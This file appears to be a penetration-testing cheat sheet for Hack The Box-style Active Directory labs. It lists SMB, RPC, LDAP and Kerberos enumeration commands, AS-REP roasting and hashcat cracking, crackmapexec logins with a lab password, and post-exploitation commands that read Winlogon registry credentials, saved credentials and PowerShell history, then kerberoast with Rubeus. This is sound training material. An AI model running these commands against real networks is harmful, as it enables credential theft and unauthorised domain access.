```bash
# nmap
nmap 10.10.10.175 --script=smb-enum* -p445


# smbclient
## anon
smbclient -L 10.10.10.175 -N
smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
> recurse on
> prompt off
> ls


#smbmap
smbmap -H 10.10.10.161
smbmap -H 10.10.10.10 -u '' -p ''
smbmap -H 10.10.10.10 -u 'guest' -p ''


# enum4linux
enum4linux -a -u "" -p "" dc-ip
enum4linux -a -u "guest" -p "" dc-ip


# rpcclient
## anon
rpcclient 10.10.10.175 -N
rpcclient -U "" -N 10.10.10.161
> enumdomusers
> enumdomgroups


# GetNPUsers.py
## anon
GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
## with usernames
GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
## hashcat
hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt


# LDAP
## anon
ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"


# kerbrute
## anon
kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local


#crackmapexec(smb/winrm)
crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
```


# On Victim
```bash
whoami /priv
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

net user /domain
net user fsmith /domain
cmdkey /list
cat (Get-PSReadlineOption).HistorySavePath
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"


# kerberoast
.\Rubeus.exe kerberoast


```

